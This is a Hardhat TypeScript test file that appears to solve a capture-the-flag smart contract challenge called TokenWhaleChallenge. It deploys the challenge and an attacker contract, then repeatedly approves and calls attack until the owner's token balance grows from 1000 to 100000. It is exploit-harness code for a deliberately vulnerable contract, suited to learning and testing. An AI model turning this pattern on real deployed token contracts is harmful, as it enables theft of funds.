import { time, loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { anyValue } from '@nomicfoundation/hardhat-chai-matchers/withArgs';
import { expect } from 'chai';
import { ethers, network } from 'hardhat';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { Contract } from 'ethers';

describe('Start Point', async function () {
  async function setup() {
    const [owner, attackerWallet] = await ethers.getSigners();
    const tokenWhaleChallengeFactory = await ethers.getContractFactory(
      'TokenWhaleChallenge'
    );
    const tokenWhaleAttackerFactory = await ethers.getContractFactory(
      'TokenWhaleAttacker'
    );

    const tokenWhaleChallengeContract = await tokenWhaleChallengeFactory.deploy(
      owner.address
    );

    const tokenWhaleAttackerContract = await tokenWhaleAttackerFactory.deploy(
      tokenWhaleChallengeContract.address,
      owner.address
    );

    return {
      tokenWhaleChallengeContract,
      tokenWhaleAttackerContract,
      owner,
      attackerWallet,
    };
  }

  describe('exploit', async function () {
    let tokenWhaleChallengeContract: Contract,
      tokenWhaleAttackerContract: Contract,
      owner: SignerWithAddress,
      attackerWallet: SignerWithAddress;

    before(async function () {
      ({
        tokenWhaleChallengeContract,
        tokenWhaleAttackerContract,
        owner,
        attackerWallet,
      } = await loadFixture(setup));
    });

    it('Should Attack after approval', async function () {
      expect(
        await tokenWhaleChallengeContract.balanceOf(owner.address)
      ).to.equal(1000);
      do {
        await tokenWhaleChallengeContract.approve(
          tokenWhaleAttackerContract.address,
          1000
        );

        await tokenWhaleAttackerContract.attack(1000);
      } while (
        (await tokenWhaleChallengeContract.balanceOf(owner.address)) < 100000
      );

      expect(
        await tokenWhaleChallengeContract.balanceOf(owner.address)
      ).to.equal(100000);
    });
  });
});
